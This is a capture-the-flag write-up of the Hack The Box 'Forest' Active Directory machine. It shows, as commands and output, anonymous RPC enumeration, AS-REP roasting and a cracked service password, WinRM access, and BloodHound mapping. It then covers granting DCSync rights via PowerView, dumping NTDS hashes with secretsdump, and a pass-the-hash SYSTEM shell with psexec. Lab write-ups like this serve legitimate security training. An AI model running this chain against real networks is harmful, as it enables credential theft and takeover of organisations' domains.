# Nmap
![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/39dddf8a-2318-4bf1-a8b0-94b3e526674c)

# using rpcclient options got user list:
```bash
└─$ rpcclient -U "" -N 10.10.10.10
```
# Enumerate Domain Users
```bash
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

# Numerate Domain Groups
```bash
rpcclient -U "" -N 10.10.10.161
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Organization Management] rid:[0x450]
group:[Recipient Management] rid:[0x451]
group:[View-Only Organization Management] rid:[0x452]
group:[Public Folder Management] rid:[0x453]
group:[UM Management] rid:[0x454]
group:[Help Desk] rid:[0x455]
group:[Records Management] rid:[0x456]
group:[Discovery Management] rid:[0x457]
group:[Server Management] rid:[0x458]
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
group:[Security Reader] rid:[0x45c]
group:[Security Administrator] rid:[0x45d]
group:[Exchange Servers] rid:[0x45e]
group:[Exchange Trusted Subsystem] rid:[0x45f]
group:[Managed Availability Servers] rid:[0x460]
group:[Exchange Windows Permissions] rid:[0x461]
group:[ExchangeLegacyInterop] rid:[0x462]
group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
group:[Service Accounts] rid:[0x47c]
group:[Privileged IT Accounts] rid:[0x47d]
group:[test] rid:[0x13ed]
```
# Query Group Information and Group Membership
```bash
rpcclient $> querygroup 0x204
        Group Name:     Domain Controllers
        Description:    All domain controllers in the domain
        Group Attribute:7
        Num Members:1


rpcclient $> querygroupmem 0x204
        rid:[0x3e8] attr:[0x7]
```
# Query Specific User Information (including computers) by RID
```bash
rpcclient $> queryuser 0x3e8
        User Name   :   FOREST$
        Full Name   :
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Tue, 27 Jun 2023 23:22:58 BST
        Logoff Time              :      Thu, 01 Jan 1970 01:00:00 BST
        Kickoff Time             :      Thu, 14 Sep 30828 03:48:05 BST
        Password last set Time   :      Tue, 27 Jun 2023 23:22:17 BST
        Password can change Time :      Wed, 28 Jun 2023 23:22:17 BST
        Password must change Time:      Thu, 14 Sep 30828 03:48:05 BST
        unknown_2[0..31]...
        user_rid :      0x3e8
        group_rid:      0x204
        acb_info :      0x00002100
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000053
        padding1[0..7]...
        logon_hrs[0..21]...
```

# Determine the Windows domain password policy 
```bash
rpcclient $> getdompwinfo
min_password_length: 7
password_properties: 0x00000000
```
# Check password length for specific user:
```bash
rpcclient $> getusrdompwinfo 0x47f
    &info: struct samr_PwInfo
        min_password_length      : 0x0007 (7)
        password_properties      : 0x00000000 (0)
               0: DOMAIN_PASSWORD_COMPLEX  
               0: DOMAIN_PASSWORD_NO_ANON_CHANGE
               0: DOMAIN_PASSWORD_NO_CLEAR_CHANGE
               0: DOMAIN_PASSWORD_LOCKOUT_ADMINS
               0: DOMAIN_PASSWORD_STORE_CLEARTEXT
               0: DOMAIN_REFUSE_PASSWORD_CHANGE
```
# Password spray attack
```bash
$ rpcclient -U "mark%bbb" -c "getusername;quit" 10.10.10.161
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```

# Lets use impacket tool- GetNPUsers.py to try get hash for each user.
```bash
┌──(singhx㉿kali)-[~]
└─$ for user in $(cat user.txt); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done

[*] Getting TGT for lucinda
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.

-----snippet-----

[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB:4a0f2542a93873e580d17f4057c48801$9db1aaae1388211bd0da0cd50fc60bf2e3ceaef18ea1b6fcddb0aec23ae807b9ac95a2609e16ca4678ee526a9aeae747440d04b11e567262f75cc32e7e0bb11078b651f1d818ec41705d462e541851eae3f91fb086acbbf7b5b186572746459cb0af4df85f2ef7767d80d06b3145302b98cc111fd7da468424cf9f272e0e7a0a92e8e529a17f539a288d06a159f175284b7d1f95090f9f6716a6992d7cdd1666ca59e4016d545fa613173f3b74671fcdc936047f915bc803f2647946e6171079d1f3a325e8400e3036ba90814778b34bbbdfd7f4c6f679007992210cdc4552af
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
```
# Got hash for one user svc-alfresco:
```craked - s3rvice```


#logged in using evil-winrm
```bash
┌──(singhx㉿kali)-[~]
└─$ evil-winrm -u svc-alfresco -p  s3rvice -i 10.10.10.161
<got user flag here>
```
# Download sharphound.ps1 to the target and invoke it. of .ps1 not works use .exe version
```bash
*Evil-WinRM* PS C:\users\svc-alfresco\downloads> .\SharpHound.exe -c All
2023-06-27T21:15:50.4311660-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2023-06-27T21:15:50.5874987-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
---------snippet------------------
 118 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2023-06-27T21:16:36.3843853-07:00|INFORMATION|SharpHound Enumeration Completed at 9:16 PM on 6/27/2023! Happy Graphing!
```
# download the .zip file to local machine.
`download 20230627211635_BloodHound.zip`

# Upload file to bloodhound:

![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/430d0c17-6c51-4300-abac-8ffc05d31005)

# In target machine use cmds:
```powershell
net user boss boss123 /add /domain
net group "Exchange Windows Permissions" /add boss
```
# Now upload powerview.ps1:

`upload PowerView.ps1`

# Type the cmds:
```bash
Import-Module ./PowerView.ps1
$SecPassword = ConvertTo-SecureString 'boss123' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('megabank\boss', $SecPassword)
Add-DomainObjectAcl -Credentials $Cred -TargetIdentity htb.local -PrincipalIdentity boss -Rights DCSync
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity boss -Rights DCSync
```
# Run secretsdump to collect the hashes:
```bash
└─$ secretsdump.py htb/boss:boss123@10.10.10.161
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
# Login using psexec
```bash
└─$ psexec.py administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$
[*] Uploading file EUmoTUCZ.exe
[*] Opening SVCManager on 10.10.10.161.....
[*] Creating service RwtR on 10.10.10.161.....
[*] Starting service RwtR.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
